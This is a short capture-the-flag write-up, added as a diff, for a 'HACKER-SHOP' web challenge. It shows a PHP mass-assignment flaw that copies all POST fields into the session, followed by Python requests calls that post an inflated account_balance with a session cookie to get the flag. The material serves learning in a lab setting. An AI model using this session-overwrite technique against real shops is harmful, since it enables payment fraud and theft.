@@ -1,0 +1,24 @@
+Main Hint is :
+In checkout.php
+    
+    foreach ($_POST as $key => $value) {
+        $_SESSION[$key] = $value;
+    }
+    
+ We have to post request as 'account_balance' > 500 to get the flag
+ 
+ python code :-
+ 
+ import requests
+ r = requests.post("http://hack.bckdr.in/HACKER-SHOP/checkout.php", data={'name':'a','address':'a','email':'a@b','mobile': 1233,'account_balance' : 5000, 'product_id': 4}, cookies={'PHPSESSID':'0mh7gsqqi5fnpr5ten74ehm6n'})
+ 
+ set cookies according to your browser.
+ after that again chip.php
+ 
+ r = requests.post("http://hack.bckdr.in/HACKER-SHOP/ship.php", data={'name':'a','address':'a','email':'a@b','mobile': 1233,'account_balance' : 5000, 'product_id': 4}, cookies={'PHPSESSID':'0mh7gsqqi5fnpr5ten74ehm6n'})
+ print(r.text)
+  
+ Now see Your account is 5000...!!!!!
+ Get the flag..
+ 
+ CTF{_flag_removed_do_it_yourselves_}
